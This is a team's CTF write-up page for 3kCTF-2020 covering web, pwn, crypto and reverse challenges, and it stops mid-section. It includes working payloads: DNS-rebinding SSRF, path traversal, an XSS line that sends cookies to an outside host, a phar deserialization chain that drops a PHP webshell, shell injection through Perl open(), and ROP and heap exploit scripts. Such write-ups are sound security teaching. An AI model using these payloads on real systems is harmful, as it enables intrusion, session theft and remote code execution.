<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>3kCTF-2020 Writeup | Black Bauhinia</title>

<meta name="keywords" content="ctf, pwnthybytes-ctf" />
<meta name="description" content="reporter (Web; 498 points) Solved by apple.
Author: rekter0
 Reporter is an online markdown reporting tool. it&#39;s free to use for everyone. there&#39;s a secret report we need located here
source
 Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the &#39;report&#39;.
There are 4 buttons on the interface: Edit, Preview, Save, and Deliver.
The first target of the challenge is to access the secret_report.">
<meta name="author" content="apple, cire meat pop, eriri, Mystiz, ozetta">
<link rel="canonical" href="https://b6a.black/posts/2020-07-28-3kctf/" />
<link href="/assets/css/stylesheet.min.9733bd0dca4a7fe1379bd36836878b5b67d7a574e270b0fd4860e518a432e117.css" integrity="sha256-lzO9DcpKf&#43;E3m9NoNoeLW2fXpXTicLD9SGDlGKQy4Rc=" rel="preload stylesheet"
    as="style">

<link rel="icon" href="https://b6a.black/favicon.ico">

<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.68.3" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-M67YZZ2MP1');
</script>



<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>



<meta property="og:title" content="3kCTF-2020 Writeup" />
<meta property="og:description" content="reporter (Web; 498 points) Solved by apple.
Author: rekter0
 Reporter is an online markdown reporting tool. it&#39;s free to use for everyone. there&#39;s a secret report we need located here
source
 Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the &#39;report&#39;.
There are 4 buttons on the interface: Edit, Preview, Save, and Deliver.
The first target of the challenge is to access the secret_report." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b6a.black/posts/2020-07-28-3kctf/" />
<meta property="article:published_time" content="2020-07-28T11:36:00+08:00" />
<meta property="article:modified_time" content="2020-07-28T11:36:00+08:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="3kCTF-2020 Writeup"/>
<meta name="twitter:description" content="reporter (Web; 498 points) Solved by apple.
Author: rekter0
 Reporter is an online markdown reporting tool. it&#39;s free to use for everyone. there&#39;s a secret report we need located here
source
 Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the &#39;report&#39;.
There are 4 buttons on the interface: Edit, Preview, Save, and Deliver.
The first target of the challenge is to access the secret_report."/>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "3kCTF-2020 Writeup",
  "name": "3kCTF-2020 Writeup",
  "description": "reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it\u0026#39;s free to use for everyone. there\u0026#39;s a secret report we need located …",
  "keywords": [
    "ctf", "pwnthybytes-ctf"
  ],
  "articleBody": "reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it's free to use for everyone. there's a secret report we need located here\nsource\n Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.\nThere are 4 buttons on the interface: Edit, Preview, Save, and Deliver.\nThe first target of the challenge is to access the secret_report.\ncurl http://reporter.3k.ctf.to/secret_report  htmlhead title403 Forbiddentitle ... Well, knew that.\nExploiting TOCTOU of the domain checking Interesting things happen in backend.php.\nif(@$_POST['deliver']){ $thisDoc=file_get_contents($dir.'/file.html'); $images = preg_match_all(\"/img src=\\\"(.*?)\\\" /\", $thisDoc, $matches); foreach ($matches[1] as $key = $value) { $thisDoc = str_replace($value , \"data:image/png;base64,\".base64_encode(fetch_remote_file($value)) , $thisDoc ) ; } When user click on the deliver button it will get the saved document, fetch_remote_file and embed it to the report with base64. Therefore users can embed images from external image hosting sites such as imgur etc.\nHow about embedding the secret_report? It does not work as it do a long list of checks:\nfunction fetch_remote_file($url) { $config['disallowed_remote_hosts'] = array('localhost'); $config['disallowed_remote_addresses'] = array(\"0.0.0.0/8\", \"10.0.0.0/8\", \"100.64.0.0/10\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/29\", \"192.0.2.0/24\", \"192.88.99.0/24\", \"192.168.0.0/16\", \"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"224.0.0.0/4\", \"240.0.0.0/4\",); // ... $addresses = get_ip_by_hostname($url_components['host']); $destination_address = $addresses[0]; // ... checks if the destination_address is in the disallowed list ... $opts = array('http' = array('follow_location' = 0,)); $context = stream_context_create($opts); return file_get_contents($url, false, $context); } function get_ip_by_hostname($hostname) { $addresses = @gethostbynamel($hostname); if (!$addresses) { // ... more attempts to get dns A records ... } return $addresses; } If we change the DNS record very quickly, which the DNS server return 1.1.1.1 at get_ip_by_hostname when it do the checking, and we return 127.0.0.1 at file_get_contents we can access the localhost and maybe we can get the secret_report.\nTherefore I wrote a script1 to act as a nameserver and give different responses.\n$ dig +short 4kctf.example.com @8.8.8.8 1.1.1.1 $ dig +short 4kctf.example.com @8.8.8.8 127.0.0.1 payload\n![](http://4kctf.example.com/secret_report/) The result is a file listing with two files:\n3ac45ca05705d39ed27d7baa8b70ecd560b69902.php secret2 63b4bacc828939706ea2a84822a4505efa73ee3e.php not much here The 3ac45ca05705d39ed27d7baa8b70ecd560b69902.php is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.\nWonders of PHP: empty(\"0\") == true I crafted this payload to read the file and get the flag.\n![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php) Back to the backend.php fetch_remote_file, besides DNS checking it also parse_url and checks scheme, port, etc.\nfunction fetch_remote_file($url) { // ... $url_components = @parse_url($url); if (!isset($url_components['scheme'])) { return false; } if (@($url_components['port'])) { return false; } if (!$url_components) { return false; } if ((!empty($url_components['scheme']) \u0026\u0026 !in_array($url_components['scheme'], array('http', 'https')))) { return false; } if (array_key_exists(\"user\", $url_components) || array_key_exists(\"pass\", $url_components)) { return false; } // ... return file_get_contents($url, false, $context); parse_url will parse as follows\narray(2) { [\"scheme\"]= string(1) \"0\" [\"path\"]= string(62) \"/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php\" } Where the scheme will return true for isset and true for empty (empty(\"0\") == true), and for file_get_contents it will recognize 0: as a folder and 0:/../ as current folder.\nxsser (Web; 499 points) Solved by ozetta.\nDescription  challenge\nAuthor: Dali\n Walkthrough Source code is provided:\n include('flag.php'); class User { public $name; public $isAdmin; public function __construct($nam) { $this-name = $nam; $this-isAdmin=False; } } ob_start(); if(!(isset($_GET['login']))){ $use=new User('guest'); $log=serialize($use); header(\"Location: ?login=$log\"); exit(); } $new_name=$_GET['new']; if (isset($new_name)){ if(stripos($new_name, 'script'))//no xss :p  { $new_name = htmlentities($new_name); } $new_name = substr($new_name, 0, 32); echo 'Error! Your msg '.$new_name.'\n'; echo 'Contact admin /req.php '; } if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){ setcookie(\"session\", $flag, time() + 3600); } $check=unserialize(substr($_GET['login'],0,56)); if ($check-isAdmin){ echo 'welcome back admin '; } ob_end_clean(); show_source(__FILE__);  From the challenge name it is about XSS. After setting $_GET['login'], you can enter something in $_GET['new'], which is supposed to be reflected on the page for XSS.\nThanks to ob_start(); and ob_end_clean();, nothing about the user input are printed in the normal case.\nTo address this, we can make the interpreter panic before ob_end_clean();. Maybe unserialize could do so?\nBut most of the time unserialize just returns FALSE when you input some garbage that is \"un-unserialize-able\" (pun intended)\nLet's try to unserialize some meaningful junks:\n foreach (get_declared_classes() as $c) { unserialize('O:'.strlen($c).':\"'.$c.'\":0:{}'); }  It shows Fatal error: Uncaught Error: Invalid serialization data for DateTime object. So DateTime should do the trick.\nHow about the actual XSS payload? We can't use .\nFor some reason script could bypass that stripos but it is too long.\nLater on I found that /req.php accepts external URLs as well. So we can use some other tricks like window.name:\nname='location=\"//blah/\"+document.cookie';location='//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E\u0026login=O:8:%22DateTime%22:0:%7B%7D'; Remarks At first I tried the payload with iframe but Chrome blocks the Set-Cookie header due to \"third-party cookies preference\".\nThen I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.\nimage uploader (Web; 498 points) Solved by ozetta.\nDescription  challenge\nsource\nAuthor: Dali\n 題解 (Walkthrough) 我知你睇唔明廣東話架啦. 今次有翻譯.\n I know you don't understand Cantonese. This time got translation.\n 個 description 得兩條奸笑5678. 是但啦有醬油有計傾.\n (Some unimportant gibberish)\n 一開 index.php 就見到 include('old.php');//todo remove this useless file :\\\n After opening index.php then we can see that include stuff...\n 明眼人一睇就知係伏啦. 一睇兩個 Class 重唔係玩 unserialize.\n Obviously it is the vulnerable point. It contains 2 classes so obviously it is about unserialize.\n 碌落 D (唔好譯啦你譯唔到個 D 架啦) 個 index.php 見到 file_get_contents. 條件反射 phar unserialize\n Scroll down [Don't translate that \"D\", you can't] that index.php, we can see file_get_contents. It immediately links to phar unserialize\n 有個 upload.php 真係可以 upload 野. 不過會 check getimagesize 同 image/jpeg\n There is an upload.php that can really upload things. But it checks with getimagesize and image/jpeg.\n 睇返個 old.php, 又係驗眼嘅時間. 最底有個 $data = \"\\n\" . $data; 但係無咩用.\n Let's go back to old.php and check our eyesight. The bottom $data = \" looks interesting but unless.\n 除非個 sprintf('%012d', $expire) 可以整走個 exit() 啦.\n Unless sprintf('%012d', $expire) could be used to get rid of that exit().\n 再碌上 D 見到個詭異嘅 variable function return $serialize($data);. 咁開心.\n Scroll up a bit then we can see a weird variable function return $serialize($data);. So exciting.\n 所以如果將 $this-options['serialize'] 改做 system 就可以行 system.\n So if we set $this-options['serialize'] to system then we could run system.\n 但係個 $data 要點砌呢. 根據所謂 POP 可以 trace 到:\n But how can we control $data? According to the so-called Property-Oriented Programming, you can trace like this:\n $this-options['serialize']($data) //cl2-serialize\n= $this-serialize($value) //cl2-set\n= $this-store-set($this-key, $this-getForStorage(), $this-expire); //cl1-save\n= return json_encode([$this-cleanContents($this-cache), $this-complete]); //cl1-getForStorage()\n首先個 $data 有少少限制. 因為係 json_encode 個 Array.\n First, the $data is a bit restricted. Because it is constructed by json_encode-ing an array.\n 不過你想用 system 行 command 其實可以好求其. 好似咩 $(ls).\n But if you just need to use system to execute command, it is pretty flexible. Like using $(ls).\n 最後可以砌到好似 system('[\"$(ls)\",0]').\n At the end of the day we should be able to construct like system('[\"$(ls)\",0]').\n 要 trigger cl1-save, destructor 個 $this-autosave 要 false.\n If you want to trigger cl1-save, in the destructor, $this-autosave should be false.\n 依家有齊啲餡啦. 要搵返 phar 個 payload.\n We are cooking with gas. Now we need to get the phar payload.\n 邊鬼個會記得點寫. 抄返自己個威噏.\n Who the heck will remember how to write the payload. Just copy my own write-up.\n https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine)\n由 $p = new Phar('malware.phar'); 果行抄起 (好似係)\n Copy the payload starting from $p = new Phar('malware.phar');\n 上面記得抄返個 Class definition 同埋改晒 D property 佢.\n Remember to copy the class definitions and change the properties to the desired one.\n 個 getimagesize 同 image/jpeg 點算? 求其攝個 jpg 向頭咪得囉.\n How to tackle getimagesize and image/jpeg? Just inject a jpg file in front.\n  Final payload key = $key; $this-store = $store; $this-expire = $expire; //add your own properties $this-cache = ['$(echo PD89YCRfR0VUWzBdYDs= | base64 -d  /var/www/html/up/z.php)']; $this-autosave = 0; $this-complete = 0; } } class cl2 { public function __construct(){ //add your own properties $this-options['serialize'] = \"system\"; $this-writeTimes = 0; $this-options['prefix'] = ''; $this-options['data_compress'] = 0; } } $x = new cl1(new cl2(),\"z\",0); $p = new Phar('malware.phar'); $p-startBuffering(); $p-addFromString(\"z\",\"\"); $j = file_get_contents(\"1.jpg\"); $p-setStub($j.\"\"); $p-setMetadata($x); $p-stopBuffering(); $file = file('malware.phar');  之後 upload 個「圖」, 出返個 \"filename.jpg\". 之後讀 php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n Then upload that \"image\", will return \"filename.jpg\". Then access php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n 之後點玩自己諗啦. 提示: 估下 PD89YCRfR0VUWzBdYDs= 係咩先.\n The rest is left as an exercise for the readers. (Hint: decode PD89YCRfR0VUWzBdYDs=)\n Remark \n呢題咁易都搞咗我個半鐘真係失敗。\n\nhttps://twitter.com/confus3r/status/1286850105513930752\n慘。早啲起身咪有 First Blood (好似係\ncarthagods (Web; 496 points) Author: rekter0, Dali\n Salute the carthagods!\nHints\n redacted source   Exploit The challenge provided the redacted sourcecode as hints.\n.htaccess\n... RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA] index.php\n...  if(@$_GET[*REDACTED*]){ $file=$_GET[*REDACTED*]; $f=file_get_contents('thecarthagods/'.$file); if (!preg_match(\"/, $f)){ echo $f; }else{ echo 'php content detected'; } } ? ...  The php script accepts user provided $file path without any sanitation, however the GET parameter is redacted.\nThe .htaccess file rewrite the path to index.php with the GET parameter. Lets try the folder thecarthagods as shown in the php file.\ncurl http://carthagods.3k.ctf.to:8039/thecarthagods We got the token\n htmlhead title301 Moved Permanentlytitle headbody h1Moved Permanentlyh1 pThe document has moved a href=\"http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods\"herea.p hr addressApache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039address bodyhtml With the token we can do path traversal\ncurl \"http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd\"root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ... However we cannot print the content of flag.php directly\ncurl \"http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php\"php content detected  From the phpinfo provided we can know opcache is enabled, with opcache.file_cache set to /var/www/cache/. Maybe we can get the compiled version of flag.php and get its content.\nThe opcache will store the cache in the format /var/www/cache//path/to/file.php.bin, with system ID generated from PHP version, Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.\nThe system ID is: e2c6579e4df1d9e77e36d2f4ff8c92b3\ncurl \"http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin\" --output -... textarea class=\"label-input100\" style=\"color:black;width: 100%;height: 300px;\"OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!= VPyi0���Y�Į��{�opcache_get_statush���JK��\u00263k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/y8zZXMLBin4\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreeniframe֖|�flag textarea ... linker (Pwn; 493 points) Solved by cire meat pop.\nProgram root@kali:~/3kctf/linker# ./linker Welcome to your secret journal! Provide name size: 8 Provide a name: abcd Welcome abcd ! What would you like to do? 1- Get new blank page 2- Edit page content 3- Empty a page 4- Relogin 5- Exit   This seems to be a heap challenge, which allow user to create, edit and free a chunk. Also, it provides a weird function (i.e., relogin) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.\nVulnerability In 3- Empty a page:\nputs(\"Provide page index:\"); read(0, \u0026buf, 4uLL); idx = atoi(\u0026buf); if ( idx  0 || idx  4 ) { puts(\"Wrong index kiddo...\"); } else if ( check_pages[idx] ) { free(pages[idx]); check_pages[idx] = 0; // vuln  --number_pages; } After freed a chunk, only the check[idx] is set to 0; and in Edit page content:\nputs(\"Provide page index:\"); read(0, \u0026buf, 4uLL); idx = atoi(\u0026buf); if ( idx  0 || idx  4 ) { puts(\"Wrong index kiddo...\"); } else if ( pages[idx] ) // not checked { puts(\"Provide new page content:\"); read(0, pages[idx], (int)page_size[idx]); } Edit function won't check check[idx], which means we can overwrite a free chunk.\nExploit As we can overwrite any data into the free chunk, we can perform some attack to overwrite __malloc_hook or __free_hook with one gadget rce.\nHowever, we had two problems.\n tcache techniques won't work with calloc  Solution: We filled up tcache and perform fastbin attack.  Theres are no show functions to leak libc addresses  Solution: We utilize unsorted bin attack to write unsorted bin address to name, then relogin to print the content of name.   Problem can't access tty; job control turned off\nWill this means we can't open the shell? Whatever, we change the approach from utilizing one gadget RCE to calling the system function. We can overwrite __free_hook with system, then free a chunk with content /bin/cat flag, yielding system(\"/bin/cat flag\"). However, if we want control __free_hook, we need to try harder. Finally, we perform fastbin attack to control pages and check_pages, edit the pointer of each page to an arbitrary address, and eventually we have arbitrary address write.\n3k{unlink_the_world_and_feel_the_void}\none and a half man (Pwn; 493 points) Solved by cire meat pop.\nProgram ssize_t vuln() { char buf; // [rsp+6h] [rbp-Ah]  return read(0, \u0026buf, 0xAAuLL); } This is a short function that obviously vulnerable to buffer overflow. I have solved similar challenge before, and my approach was to overwrite first 2 byte the read_got to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it. It works, but can't access tty; job control turned off. Okay, I shouldn't forgot shell interaction is disabled from this server.\nExploit I find a syscall near the one gadget RCE so that we can jump to syscalls. It's time to construct ROP:\nmov eax, 0 ; pop rbp ; ret g1(in binary) mov edx, eax ; mov eax, edx ; ret (in libc) pop rdi; ret (in binary) pop rsi; pop r15; ret (in binary) move eax, 0x3b; syscall (in libc) By this ROP chain we can set edx (the third argument) to 0, control rdi and rsi (the first and the second arguments) and call sys_execve.\nsys_execve(*filename, argv[], envp[]) To cat flag:\nsys_execve('/bin/cat', ['/bin/cat', 'flag'], 0) Finally our script:\npayload = \"a\"*18 + flat(pop_rsi_r15, buf, 0, read_plt, vuln) p.send(payload) sleep(0.5) string = \"/bin/cat\".ljust(0x10,\"\\x00\")+p64(buf)+p64(buf+0x28) \\ +p64(0)+\"flag\"+\"\\x00\"*4 p.send(string) sleep(0.5) payload2 = flat(pop_rsi_r15, setvbuf_got, 0, read_plt, pop_rsi_r15, read_got, \\ 0, read_plt, g1, buf, setvbuf_plt, pop_rdi, buf, pop_rsi_r15, \\ buf+0x10, 0, read_plt) ret p.send(\"a\"*18 + payload2) sleep(0.5) p.send(\"\\x5b\\xd6\") # (in libc) mov edx, eax ; mov eax, edx ; ret sleep(0.5) p.send(\"\\x72\\x04\") # (in libc) move eax, 0x3b; syscall sleep(0.5) p.interactive() 3k{one_byte_and_a_half_overwrite_ftw!}\nmicroscopic (Reverse; 488 points) Solved by Mystiz.\nOpen with IDA pro. There is a curious function defined on sub_F7C:\nunsigned __int64 __fastcall sub_F7C(unsigned int a1) { case 3: // ...  // v3 hereby is the length of the length of the target ciphertext  ciphertext[v2] = (v3 ^ input[v12]) + v2; // ...  break; case 4: // ...  v9 = ciphertext[v12] != target_ciphertext[v12]; // ...  break; }  Hereby target_ciphertext is is an array of 39 integers, located on 0x202020. We can simply write a Python script that extract target_ciphertext and compute the corresponding input.\nelf = ELF('challenge/micro') target = elf.read(0x202020, 39*4) target = [unpack('I', target[4*i:4*i+4])[0] for i in range(39)] target = [(c-i)^39 for i, c in enumerate(target)] print(bytes(target)) # 3k{nan0mites_everywhere_everytime_ftw!} game (Reverse/Misc; 486+477 points) Solved by eriri.\ngame 1 find your way to the heart of the maze game 2 the shortest route is often the best You are given an Unity game folder at the beginning. When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.\nI think there should be multiple ways to solve the challenge. One solution will be physcially break the maze. How to do that? By deleting the walls object in the level.\nWith Unity Assets Bundle Extractor, we are able to delete walls in /CTF_Data/level0 (which is level of the maze). \nAfter deleting some of the wall objects (for me I selected the GameObject Wall with number greater than 100) and returning to the game, you will find a wall that marks the flag for game 2:\n\nThere are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: 3K-CTF-A-MAZE-ING.\nThere are also some floating walls inside the maze. When you walk through it you will get a word overlayed on the top left corner. \nDecompiling /CTF_Data/Managed/Assembly-CSharp.dll will get you the logic of the game.  If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed. \nHere in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game. \nAfter some tries (with a bit of luck), we were able to get the flag for game 1. \nFlag: 3K-CTF-GamingIsNotACrime.\nReference: https://github.com/imadr/Unity-game-hacking\npyzzle (Reverse/Misc/Crypto; 459+479 points) Solved by crabmony and Mystiz.\nPart 1 We are given a concrete syntax tree that is from LibCST.\nWe referred to the documentation and traverse the tree manually. Eventually we have manually parsed the tree into a Python script:\nimport binascii plaintext = 'REDACTED' def exor(a, b): temp = \"\" for i in range(n): if a[i] == b[i]: temp = 0 else: temp = 1 return temp def BinaryToDecimal(binary): string = int(binary, 2) return string PT_Ascii = [ord(x) for x in plaintext] PT_Bin = [format(y, '08b') for y in PT_Ascii] PT_Bin = \"\".join(PT_Bin) n = 26936 K1 = '...' # Redacted as this binary string is too long. K2 = '...' # Ditto L1 = PT_Bin[:n] R1 = PT_Bin[n:] f1 = exor(R1,K1) R2 = exor(f1, L1) L2 = R1 f2 = exor(R2, K2) R3 = exor(f2, L2) L3 = R2 R3 = '...' # Ditto L3 = '...' # Ditto cipher = L3 + R3 plaintext = L6 + R6 plaintext = int(plaintext, 2) plaintext = binascii.unhexlify('%x' % plaintext) print(plaintext) Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: 3k{almost_done_shizzle_up_my_nizzle}.\nPart 2 From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:\ndef parse_line(line): return list(map(int, line.split(' ')[1:])) def main(): with open('pyzzle2') as f: lines = f.read().strip().split('\\n') edges = list(map(parse_line, lines[8:124])) points = list(map(parse_line, lines[127:271])) point_map = {} for id, x, y in points: point_map[id] = (x, y) im = Image.new('1', (1850, 110), color=1) draw = ImageDraw.Draw(im) for id1, id2, _ in edges: x1, y1 = point_map.get(id1) x2, y2 = point_map.get(id2) draw.line((x1, y1, x2, y2), fill=0) im.save('flag.png') main() \nFlag: 3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE.\nA hundred friends (Crypto; 496 points) Solved by Mystiz.\nkey = RSA.generate(1024) pad = random.randint(1, 2**UPPER_BOUND) exp = random.randint(1, 3) c = pow(m**exp + pad, 3, key.n) This is a challenge similar to Multicast in PlaidCTF 2017. Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with exp = 1.\nWe have written the core logic to retrieve the message, given some ciphertexts:\ndef attempt(subpairs): n = len(subpairs) # (m + pi)^3 = ci (mod ni) cs = list(map(lambda pair: pair[0], subpairs)) ns = list(map(lambda pair: pair[1], subpairs)) ps = list(map(lambda pair: pair[2], subpairs)) nprod = reduce(mul, ns) gs = [[0 for _ in range(n)] for _ in range(3+1)] for i in range(n): for j in range(3+1): gs[j][i] = binomial(3, j) * pow(ps[i], j, nprod) % ns[i] gs[3][i] = ((gs[3][i] - cs[i]) % ns[i] + ns[i]) % ns[i] gg = [int(crt(gs[i], ns)) for i in range(3+1)] # Defines e, Zn = Zmod(nprod) and the parameters for the # Coppersmith's attack here. Omitted roots = coppersmith_howgrave_univariate(pol, nprod, beta, mm, tt, XX) if len(roots)  0: return roots[0] (Some functions are copied from mimoo/RSA-and-LLL-attacks. They are not included here for simplicity)\nHowever, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn't small enough for Coppersmith's attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:\nn = 5 attempt_count = 0 while True: random.shuffle(pairs) subpairs = pairs[:n] attempt_count += 1 if attempt_count % 100 == 0: print(f'Attempt {attempt_count}') m = attempt(subpairs) if m is None: continue m = int(m) flag = m.to_bytes(length=(m.bit_length() + 7)//8, byteorder='big') print(subpairs) print(flag) break # b'3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' Note that there is a chance to return m^2 or m^3. As I am lazy, I just run the script again until it returns m.\nRSA textbook (Crypto; 496 points) Solved by Mystiz.\nThis challenge is similar to De1CTF's easyRSA. By reading the same reference paper [Howgrave-Graham 1999], we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover d1 (the private key that corresponds to e1). We can then recover phi(n) and thus compute d (that corresponds to e), hence decrypting the ciphertext: 3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA.\nYou shall not get my cookies (Crypto; 495 points) Solved by Mystiz.\nThis is a standard padding oracle attack.\ndef connect(): HOST = 'youshallnotgetmycookies.3k.ctf.to' PORT = 13337 global debug if debug: context.log_level = 'debug' else: context.log_level = 'error' r = remote(HOST, PORT) return r def oracle(ciphertext): r = connect() payload = binascii.hexlify(ciphertext) r.sendlineafter(b'~ So... whats your cookie:', payload) r.recvuntil(b'~ ') res = r.recvline().strip() r.close() return res != b'That cookie looks burned!' def main(): ciphertext = binascii.unhexlify('90C560B2A01529EF986E54B016E1FEAAD79A54BE52B373311E3B4F8251BE269EC199AE6B370BFCE50A54EEC25ABB0F22') po = PaddingOracle(oracle, threads=16) plaintext = po.recover(ciphertext) print(plaintext) # b' chocolate chip cookie\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' ciphertext = po.forge(b'Maple Oatmeal Biscuits' + b'\\x0a' * 10) r = connect() r.sendlineafter(b'~ So... whats your cookie:', binascii.hexlify(ciphertext)) r.interactive() # ~ YES, that is exactly what i wanted! # ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle} main() once upon a time (Crypto; 492 points) Solved by Mystiz.\nWith a bit of code review, it is running a block cipher with block size = 1 (Source: the encrypt_file method in /src/cipher.c). The key is also redacted from the source (Source: /src/main.c). Moreover, surprisingly, the key is not redacted from the binary.\n*(_QWORD *)v45 = '\\x01\\0\\0\\0\\x01\\x01\\x01\\0'; *(_QWORD *)\u0026v45[8] = '\\x01\\0\\x01\\0\\0\\x01\\x01\\0'; *(_QWORD *)\u0026v45[16] = '\\x01\\0\\x01\\0\\x01\\0\\0'; *(_QWORD *)\u0026v45[24] = '\\x01\\x01\\x01\\x01\\x01\\0\\0\\x01'; *(_QWORD *)\u0026v45[32] = '\\x01\\0\\0\\0\\0\\0\\x01\\x01'; But if you think I am going to reverse the algorithm, you are wrong. I'm just using the binary as an encryption oracle.\ndef encrypt(plaintext, mode): context.log_level = 'error' with open('plaintext', 'wb') as f: f.write(plaintext) r = process(['challenge/scss', 'plaintext', 'ciphertext', 'encrypt', mode]) r.wait_for_close() r.close() with open('ciphertext', 'rb') as f: ciphertext = f.read() return ciphertext def recover(target_ciphertext, mode): message = b'' for i in range(len(target_ciphertext)): for j in range(256): plaintext = message + bytes([j]) ciphertext = encrypt(plaintext, mode) if target_ciphertext.startswith(ciphertext): message = plaintext print(i, message) break return message def main(): with open('challenge/flag_encrypted', 'rb') as f: target_ciphertext = f.read() # print(recover(target_ciphertext, 'ecb')) # print(recover(target_ciphertext, 'cbc')) # print(recover(target_ciphertext, 'cfb')) print(recover(target_ciphertext, 'ofb')) # b'3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}' flood (Misc; 495 points) Solved by Mystiz.\nWe have a service running remotely. The source code, service.pl, is given to us. Perl sadness2 strikes back...\nObviously, we can actually earn more gold by selling gold. From the source code:\nprint \"? how much gold u wanna spend\\n\"; print \"! 1 GOLD = 1000 POINTS\\n \"; my $subm = ; chomp $subm; if( ($subm)  $gold and int($subm)=0){ $gold -= ($subm); $points += ($subm)*1000; } Why? We can set $subm = -0.9999... In this case we can generate as much gold as we want.\nAnother vulnerability comes from theh following line that runs during load game. This API opens if you are rich enough -- well, we are.\n# $name is what we can control. However, `.`, `/` and ` ` are forbidden. open (SAVEGAME, \"/app/files/\".$name) or break; How? For example, if $name = \"||ls|\"; it executes ls from shell. But what if we want to execute ls / given that and / are forbidden? In short, we can use \\t () in place of the (), and $(expr\\tsubstr\\t$PWD\\t1\\t1) in place of /.\nHence, we can send use ||ls\\t\"$(expr\\tsubstr\\t$PWD\\t1\\t1)\"\\t-al| as our name and the directory can be listed. The following line is curious...\n-rw-r--r-- 1 root root 30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README' We can use cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README (with the above substitution) as our name. Finally the flag is there: 3k{p333rl_aInt_7hat_deAd_Y3t}.\nlibcDB (Misc; 494 points) We are given a libc database search (which looks useful and we should definitely have one ourselves!). Playing with the API we have met the following error:\n .search fprintf 0x4b970 .. jq: error: Invalid numeric literal at EOF at line 1, column 3 (while parsing '...') at , line 1: . as $maindb | .libcDB[] | select(.symbol==\"fprintf\") | select(.address|contains(\"309616\")) | ... jq: 1 compile error If we have to make an educated guess on the actual query, it would be:\njq '. as $maindb | .libcDB[] | select(.symbol==\"[SYMBOL]\") \\ | 